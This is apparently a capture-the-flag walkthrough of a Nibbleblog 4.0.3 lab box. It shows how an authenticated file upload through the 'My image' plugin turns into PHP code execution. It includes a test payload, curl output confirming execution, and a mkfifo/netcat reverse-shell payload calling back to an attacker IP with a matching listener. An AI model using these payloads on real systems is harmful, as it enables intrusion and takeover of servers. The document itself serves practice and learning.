ok, we're logged in to the admin portal whats next? we need to turn this access into code execution and ideally gain a reverse shell to the webserver. As with everything, lets reenumerate below is a table of what we find 

| Page     | Content                                                                                                         |
| -------- | --------------------------------------------------------------------------------------------------------------- |
| Publish  | making a new post, video, post, quote post, or new page                                                         |
| Comments | shows no published comments                                                                                     |
| Manage   | Allows us to manage posts, pages, and categories. We can edit and delete categories                             |
| Settings | Scrolling to the bottom confirms that the vulnerable version 4.0.3 is in use. Several settings are available    |
| Themes   | This allows us to install a new theme from a pre-selected list                                                  |
| Plugins  | Allows us to configure, install, or uninstall plugins. The `My image` plugin allows us to upload an image file  |
from these options if we go to Plugins>My Image we have the ability to upload a file. lets see if we can upload a PHP code instead of an image. lets create a .php file containing the following 
`<?php system("id"); ?>`

we get a bunch of errors when we upload that and save changes. BUT it does say that is save correctly. 

now we gotta find the results of it. in our case its in /content/private/plugins/my_image which means if we run `curl http://<TARGET_IP>/nibbleblog/content/private/plugins/my_image` we will get the output of that command, and sure enough it says
```
┌─[us-dedivip-3]─[10.10.14.169]─[n00blyfe@htb-vzkuchtbfo]─[~]
└──╼ [★]$ curl http://10.129.64.135/nibbleblog/content/private/plugins/my_image/image.php
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)

```
ok well that's cool now lets upload a bash shell from [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) change your file to say:
```
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> 6969 > /tmp/f"); ?>
```
before we upload and run, lets set up our listener
```
n00blyfe@htb$ nc -lvnp 6969

listeninng on [any]6969
```
now upload the payload and curl it. congrats you now have a reverse shell